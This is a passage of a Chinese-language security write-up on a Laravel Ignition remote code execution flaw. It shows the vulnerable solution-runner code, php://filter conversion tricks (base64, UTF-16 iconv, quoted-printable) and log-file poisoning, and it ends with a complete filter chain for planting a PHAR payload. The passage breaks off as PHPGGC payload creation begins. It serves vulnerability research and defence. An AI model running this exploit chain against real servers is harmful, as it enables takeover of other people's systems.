<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MakeViewVariableOptionalSolution</span> <span class="k">implements</span> <span class="nx">RunnableSolution</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">run</span><span class="p">(</span><span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[])</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">makeOptional</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$output</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;viewFile&#39;</span><span class="p">],</span> <span class="nv">$output</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">makeOptional</span><span class="p">(</span><span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[])</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$originalContents</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;viewFile&#39;</span><span class="p">]);</span> <span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$newContents</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;$&#39;</span><span class="o">.</span><span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;variableName&#39;</span><span class="p">],</span> <span class="s1">&#39;$&#39;</span><span class="o">.</span><span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;variableName&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34; ?? &#39;&#39;&#34;</span><span class="p">,</span> <span class="nv">$originalContents</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$originalTokens</span> <span class="o">=</span> <span class="nx">token_get_all</span><span class="p">(</span><span class="nx">Blade</span><span class="o">::</span><span class="na">compileString</span><span class="p">(</span><span class="nv">$originalContents</span><span class="p">));</span> <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$newTokens</span> <span class="o">=</span> <span class="nx">token_get_all</span><span class="p">(</span><span class="nx">Blade</span><span class="o">::</span><span class="na">compileString</span><span class="p">(</span><span class="nv">$newContents</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$expectedTokens</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">generateExpectedTokens</span><span class="p">(</span><span class="nv">$originalTokens</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;variableName&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$expectedTokens</span> <span class="o">!==</span> <span class="nv">$newTokens</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [3]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$newContents</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="k">function</span> <span class="nf">generateExpectedTokens</span><span class="p">(</span><span class="k">array</span> <span class="nv">$originalTokens</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$variableName</span><span class="p">)</span><span class="o">:</span> <span class="k">array</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$expectedTokens</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$originalTokens</span> <span class="k">as</span> <span class="nv">$token</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$expectedTokens</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$token</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="nx">T_VARIABLE</span> <span class="o">&amp;&amp;</span> <span class="nv">$token</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;$&#39;</span><span class="o">.</span><span class="nv">$variableName</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$expectedTokens</span><span class="p">[]</span> <span class="o">=</span> <span class="p">[</span><span class="nx">T_WHITESPACE</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$token</span><span class="p">[</span><span class="mi">2</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$expectedTokens</span><span class="p">[]</span> <span class="o">=</span> <span class="p">[</span><span class="nx">T_COALESCE</span><span class="p">,</span> <span class="s1">&#39;??&#39;</span><span class="p">,</span> <span class="nv">$token</span><span class="p">[</span><span class="mi">2</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$expectedTokens</span><span class="p">[]</span> <span class="o">=</span> <span class="p">[</span><span class="nx">T_WHITESPACE</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$token</span><span class="p">[</span><span class="mi">2</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$expectedTokens</span><span class="p">[]</span> <span class="o">=</span> <span class="p">[</span><span class="nx">T_CONSTANT_ENCAPSED_STRING</span><span class="p">,</span> <span class="s2">&#34;&#39;&#39;&#34;</span><span class="p">,</span> <span class="nv">$token</span><span class="p">[</span><span class="mi">2</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$expectedTokens</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这段代码比我们预想的要复杂一些：它会在读取给定的文件路径[1]后，将<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://g.yuque.com/gr/latex?variableName%e6%9b%bf%e6%8d%a2%e4%b8%ba"
        data-srcset="https://g.yuque.com/gr/latex?variableName%e6%9b%bf%e6%8d%a2%e4%b8%ba, https://g.yuque.com/gr/latex?variableName%e6%9b%bf%e6%8d%a2%e4%b8%ba 1.5x, https://g.yuque.com/gr/latex?variableName%e6%9b%bf%e6%8d%a2%e4%b8%ba 2x"
        data-sizes="auto"
        alt="https://g.yuque.com/gr/latex?variableName替换为"
        title="img" />variableName ?? &lsquo;&rsquo;，初始文件和新文件都将被标记化[2]。如果我们的代码结构没有发生超出预期的变化，文件将被替换为新的内容。否则，makeOptional将返回false[3]，新文件将不会被写入。因此，我们无法使用variableName做太多事情。</p>
<p>剩下的唯一输入变量就是viewFile。如果我们对variableName和它的所有用法进行抽象，我们最终会得到下面的代码片段：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$contents</span> <span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;viewFile&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;viewFile&#39;</span><span class="p">],</span> <span class="nv">$contents</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>到目前为止，大家可能都听说过Orange Tsai演示的上传进度技术。该技术利用php://filter在返回文件之前修改其内容。借助于该技术，我们就可以通过漏洞利用原语来转换文件的内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="nb">test</span> <span class="p">|</span> base64 <span class="p">|</span> base64 &gt; /path/to/file.txt
</span></span><span class="line"><span class="cl">$ cat /path/to/file.txt
</span></span><span class="line"><span class="cl">ZEdWemRBbz0K
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;php://filter/convert.base64-decode/resource=/path/to/file.txt&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Reads /path/to/file.txt, base64-decodes it, returns the result</span>
</span></span><span class="line"><span class="cl"><span class="nv">$contents</span> <span class="o">=</span> file_get_contents<span class="o">(</span><span class="nv">$f</span><span class="o">)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="c1"># Base64-decodes $contents, then writes the result to /path/to/file.txt</span>
</span></span><span class="line"><span class="cl">file_put_contents<span class="o">(</span><span class="nv">$f</span>, <span class="nv">$contents</span><span class="o">)</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cat /path/to/file.txt
</span></span><span class="line"><span class="cl"><span class="nb">test</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们已经改变了文件的内容！遗憾的是，这将会应用两次转换。阅读文档后，我们找到了只进行一次转换的方法：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># To base64-decode once, use:</span>
</span></span><span class="line"><span class="cl"><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;php://filter/read=convert.base64-decode/resource=/path/to/file.txt&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># OR</span>
</span></span><span class="line"><span class="cl"><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;php://filter/write=convert.base64-decode/resource=/path/to/file.txt&#39;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>坏字符甚至都会被忽略：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;:;.!!!!!ZEdWemRBbz0K:;.!!!!!&#39;</span> &gt; /path/to/file.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$contents</span> <span class="o">=</span> file_get_contents<span class="o">(</span><span class="nv">$f</span><span class="o">)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">file_put_contents<span class="o">(</span><span class="nv">$f</span>, <span class="nv">$contents</span><span class="o">)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ cat /path/to/file.txt
</span></span><span class="line"><span class="cl"><span class="nb">test</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>默认情况下，Laravel的日志文件（存放PHP错误和堆栈跟踪）是存储在storage/log/laravel.log中的。下面，让我们通过尝试加载一个不存在的文件来生成一个错误, 即SOME_TEXT_OF_OUR_CHOICE：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>2021-01-11 12:39:44<span class="o">]</span> local.ERROR: file_get_contents<span class="o">(</span>SOME_TEXT_OF_OUR_CHOICE<span class="o">)</span>: failed to open stream: No such file or directory <span class="o">{</span><span class="s2">&#34;exception&#34;</span>:<span class="s2">&#34;[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75)
</span></span></span><span class="line"><span class="cl"><span class="s2">[stacktrace]
</span></span></span><span class="line"><span class="cl"><span class="s2">#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions-&gt;handleError()
</span></span></span><span class="line"><span class="cl"><span class="s2">#1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents()
</span></span></span><span class="line"><span class="cl"><span class="s2">#2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution-&gt;makeOptional()
</span></span></span><span class="line"><span class="cl"><span class="s2">#3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution-&gt;run()
</span></span></span><span class="line"><span class="cl"><span class="s2">#4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\Ignition\\Http\\Controllers\\ExecuteSolutionController-&gt;__invoke()
</span></span></span><span class="line"><span class="cl"><span class="s2">[...]
</span></span></span><span class="line"><span class="cl"><span class="s2">#32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\Pipeline\\Pipeline-&gt;Illuminate\\Pipeline\\{closure}()
</span></span></span><span class="line"><span class="cl"><span class="s2">#33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\Pipeline\\Pipeline-&gt;then()
</span></span></span><span class="line"><span class="cl"><span class="s2">#34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\Foundation\\Http\\Kernel-&gt;sendRequestThroughRouter()
</span></span></span><span class="line"><span class="cl"><span class="s2">#35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\Foundation\\Http\\Kernel-&gt;handle()
</span></span></span><span class="line"><span class="cl"><span class="s2">#36 /work/pentest/laravel/laravel/server.php(21): require_once(&#39;/work/pentest/l...&#39;)
</span></span></span><span class="line"><span class="cl"><span class="s2">#37 {main}
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们可以向文件中注入（几乎）任意的内容了。理论上讲，我们可以使用Orange发明的技术将日志文件转换为有效的PHAR文件，然后，使用phar://包装器来运行序列化的代码。遗憾的是，这实际上是行不通的，并且原因有很多。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">我们在前面说过，当对一个字符串进行ba</span> <span class="nx">se64</span><span class="o">-</span><span class="nx">decoding处理时，PHP会忽略任何坏字符。这通常是正确的，但是有一个字符除外，即</span><span class="o">=</span><span class="nx">。如果你使用ba</span> <span class="nx">se64</span><span class="o">-</span><span class="nx">decode过滤一个中间含有字符</span><span class="o">=</span><span class="nx">的字符串，PHP将产生一个错误，并且不会返回任何内容。</span>
</span></span><span class="line"><span class="cl"><span class="nx">如果我们能控制整个文件，那就好了。然而，我们注入到日志文件中的文本只是其中很小的一部分。它不仅有一个不算很大的前缀（日期），还有一个臃肿的后缀（堆栈跟踪）。此外，我们注入的文本还出现了两次！</span>
</span></span><span class="line"><span class="cl"><span class="nx">下面是另一件可怕的事情：</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">&gt;</span> <span class="nx">var_dump</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;[2022-04-3023:59:11]&#39;</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl"><span class="nx">string</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">&gt;</span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s1">&#39;[2022-04-12 23:59:11]&#39;</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl"><span class="nx">string</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="s2">&#34;2&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>根据日期的不同，对前缀进行两次解码时，会得到不同大小的结果。当我们对它进行第三次解码时，在第二种情况下，我们的payload将以2作为前缀，从而需要改变base64消息的对齐方式。</p>
<p>为了使其正常运行，我们必须为每个目标建立一个新的payload，因为堆栈跟踪中包含绝对文件名；并且，每秒都需要建立一个新的payload，因为前缀中包含时间。并且，只要有一个字符=需要进行base64-decode处理，仍然会面临失败。</p>
<p>因此，我们回到PHP文档中寻找其他类型的过滤器。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">[previous log entries]
</span></span><span class="line"><span class="cl">[prefix]PAYLOAD[midfix]PAYLOAD[suffix]
</span></span></code></pre></td></tr></table>
</div>
</div><p>遗憾的是，我们已经了解到，如果滥用base64-decode的话，可能会在某个时候失败。现在，让我们来利用这一点：如果我们滥用它，将发生解码错误，日志文件将被清除！这样，我们触发的下一个错误将单独存在于日志文件中：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">[prefix]PAYLOAD[midfix]PAYLOAD[suffix]
</span></span></code></pre></td></tr></table>
</div>
</div><p>现在，我们又回到了最初的问题上：保留一个payload并删除其余的。幸运的是，php://filter并不限于base64操作。例如，我们可以用它来转换字符集，下面是从UTF-16到UTF-8的转换：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="o">-</span><span class="nx">ne</span> <span class="s1">&#39;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0[midfix]P\0A\0Y\0L\0O\0A\0D\0[Some suffix ]&#39;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">test</span><span class="o">.</span><span class="nx">txt</span>
</span></span><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">卛浯⁥牰晥硩崠PAYLOAD浛摩楦嵸PAYLOAD卛浯⁥畳晦硩崠</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们的payload还在那里，安全无恙，只是前缀和后缀变成了非ASCII字符。然而，在日志条目中，我们的payload出现了两次，而不是一次。我们需要去掉第二个。</p>
<p>由于每个UTF-16字符占用两个字节，所以，我们可以通过在PAYLOAD的第二个实例的末尾增加一个字节，来使其无法对齐：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> -ne <span class="s1">&#39;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0X[midfix]P\0A\0Y\0L\0O\0A\0D\0X[Some suffix ]&#39;</span> &gt; /tmp/test.txt
</span></span><span class="line"><span class="cl">php &gt; <span class="nb">echo</span> file_get_contents<span class="o">(</span><span class="s1">&#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">卛浯⁥牰晥硩崠PAYLOAD存業晤硩偝䄀夀䰀伀䄀䐀堀卛浯⁥畳晦硩崠
</span></span></code></pre></td></tr></table>
</div>
</div><p>这样做的好处是，前缀的对齐方式不再重要：如果前缀大小相等，第一个payload将被正确解码；否则的话，第二个payload就会被正确解码。</p>
<p>如果将上面的发现与前面的base64-decoding结合起来，就能够对我们想要的任何东西进行编码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="err">$</span> <span class="k">echo</span> <span class="o">-</span><span class="nx">n</span> <span class="nx">TEST</span><span class="o">!</span> <span class="o">|</span> <span class="nx">base64</span> <span class="o">|</span> <span class="nx">sed</span> <span class="o">-</span><span class="nx">E</span> <span class="s1">&#39;s/./\0\\0/g&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nx">V\0E\0V\0T\0V\0C\0E\0</span><span class="o">=</span><span class="nx">\0</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="k">echo</span> <span class="o">-</span><span class="nx">ne</span> <span class="s1">&#39;[Some prefix ]V\0E\0V\0T\0V\0C\0E\0=\0X[midfix]V\0E\0V\0T\0V\0C\0E\0=\0X[Some suffix ]&#39;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">test</span><span class="o">.</span><span class="nx">txt</span>
</span></span><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://filter/read=convert.iconv.utf16le.utf-8|convert.base64-decode/resource=/tmp/test.txt&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">TEST</span><span class="o">!</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>说到对齐，如果日志文件本身不是2字节对齐的，转换过滤器将如何处理？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">PHP Warning:  file_get_contents(): iconv stream filter(&#34;utf16le&#34;=&gt;&#34;utf-8&#34;): invalid multibyte sequence in phpshell code on line 1
</span></span></code></pre></td></tr></table>
</div>
</div><p>这又是一个问题。不过，我们可以借助两个payload来轻松地解决这个问题：一个是无害的payload A，另一个是具有攻击性的payload B，具体如下所示：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">[prefix]PAYLOAD_A[midfix]PAYLOAD_A[suffix]
</span></span><span class="line"><span class="cl">[prefix]PAYLOAD_B[midfix]PAYLOAD_B[suffix]
</span></span></code></pre></td></tr></table>
</div>
</div><p>由于这里前缀、中缀和后缀都存在两份，还提供了payload_a和payload_b，所以，日志文件的大小必然是偶数，从而避免了错误的发生。</p>
<p>最后，我们还要解决最后一个问题：我们使用NULL字节将payload的字节从一个填充为两个。在PHP中试图加载一个带有NULL字节的文件时，会生成以下错误：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">PHP Warning: file_get_contents() expects parameter 1 to be a valid path, string givenin php shell code on line 1
</span></span></code></pre></td></tr></table>
</div>
</div><p>因此，我们将无法在错误日志中注入带有NULL字节的payload。幸运的是，最后一个过滤器可以帮到我们，它就是convert.quoted-printable-decode。</p>
<p>我们可以使用=00对NULL字节进行编码。</p>
<p><strong>下面是我们最终的转换链：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">viewFile</span><span class="o">:</span><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">write</span><span class="o">=</span><span class="nx">convert</span><span class="o">.</span><span class="nx">quoted</span><span class="o">-</span><span class="nx">printable</span><span class="o">-</span><span class="nx">decode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">utf</span><span class="o">-</span><span class="mi">16</span><span class="nx">le</span><span class="o">.</span><span class="nx">utf</span><span class="o">-</span><span class="mi">8</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">ba</span> <span class="nx">se64</span><span class="o">-</span><span class="nx">decode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=/</span><span class="nx">path</span><span class="o">/</span><span class="nx">to</span><span class="o">/</span><span class="nx">storage</span><span class="o">/</span><span class="nx">logs</span><span class="o">/</span><span class="nx">laravel</span><span class="o">.</span><span class="nx">log</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建一个PHPGGC payload，并对其进行编码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
